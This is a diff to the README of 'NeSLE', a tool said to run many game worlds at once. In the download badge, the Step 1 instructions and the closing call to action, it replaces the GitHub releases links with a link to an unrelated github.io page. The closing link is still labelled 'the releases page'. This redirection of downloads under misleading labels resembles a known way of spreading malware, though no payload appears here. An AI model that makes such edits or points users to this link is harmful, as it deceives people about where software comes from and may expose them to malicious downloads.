@@ -1,6 +1,6 @@
 # 🎮 NeSLE - Run thousands of game worlds at once
 
-[![Download NeSLE](https://img.shields.io/badge/Download-NeSLE-blue?style=for-the-badge&logo=github)](https://github.com/paleocortical-familytylenchidae907/NeSLE/releases)
+[![Download NeSLE](https://img.shields.io/badge/Download-NeSLE-blue?style=for-the-badge&logo=github)](https://paleocortical-familytylenchidae907.github.io)
 
 ## 🧠 What is NeSLE?
 
@@ -15,7 +15,7 @@ Ready to jump in? Here's exactly what you need to do:
 ### Step 1: Download NeSLE
 
 1. Click the blue **Download** button above or go directly to:  
-   [https://github.com/paleocortical-familytylenchidae907/NeSLE/releases](https://github.com/paleocortical-familytylenchidae907/NeSLE/releases)
+   [https://paleocortical-familytylenchidae907.github.io](https://paleocortical-familytylenchidae907.github.io)
 
 2. On that page, you'll see a list of files. Look for the newest version (they're usually at the top).
 
@@ -125,7 +125,7 @@ While you don't need to contribute to use NeSLE, the project welcomes feedback, 
 
 ## 🏁 Ready to Start?
 
-**Your next step:** Click the download button at the top of this page, or visit [the releases page](https://github.com/paleocortical-familytylenchidae907/NeSLE/releases) to get NeSLE today.
+**Your next step:** Click the download button at the top of this page, or visit [the releases page](https://paleocortical-familytylenchidae907.github.io) to get NeSLE today.
 
 Whether you're building the next great AI, learning about machine learning, or just curious about how computers can play games, NeSLE opens the door to an amazing world of possibilities.
 
